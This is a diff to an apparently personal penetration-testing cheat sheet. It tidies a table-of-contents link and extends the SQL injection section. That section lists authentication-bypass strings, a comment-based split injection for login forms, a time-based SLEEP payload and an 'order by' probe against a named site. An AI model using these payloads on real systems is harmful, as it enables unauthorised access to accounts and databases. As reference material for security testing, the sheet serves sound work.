@@ -11,7 +11,7 @@ Good cheat-sheets (if shit here doesn't work):
 - [Security Setup](#security-setup) 
 - [Common 6843 words](#common-6843-words)  
 - [Recon: Network Mapping](#recon---network-mapping)
-- [Recon: Subdomain + File/Dir Bruteforcing](#recon---subdomain-and-directory-bruteforcing)
+- [Recon: Subdomain and File/Dir Bruteforcing](#Recon---Subdomain-and-Directory-Bruteforcing)
 - [Authentication / Session Management](#authentication-and-session-management)
 - [Local / Remote File Inclusion](#Local and Remote File Inclusion)
 - [SQL Injection](#SQLi)
@@ -190,12 +190,19 @@ Another LFI / LFI->RCE Cheatsheet:
 ### SQLi
 ---
 
+SQL Cheatsheet: http://www.cheat-sheets.org/sites/sql.su/
+
 **Authentication Bypass**
 ```
-admin' --
-' or 1=1--
-' or '1'='1
-' or '1'='1 --
+Auth Form Bypass Example: SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
+  [user_field]’ OR 1=1; /*
+  [pass_field]*/--
+  
+Other things try:
+  admin' --
+  ' or 1=1--
+  ' or '1'='1
+  ' or '1'='1 --
 ```
 **Logic Testing**
 ```
@@ -214,7 +221,8 @@ company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED
 
 **Select/Union: Exfiltrating data**
 ```
-add stuff here
+ns.agency/stuff.php?id=3 order by 1
+
 ```
 
 **Insert**
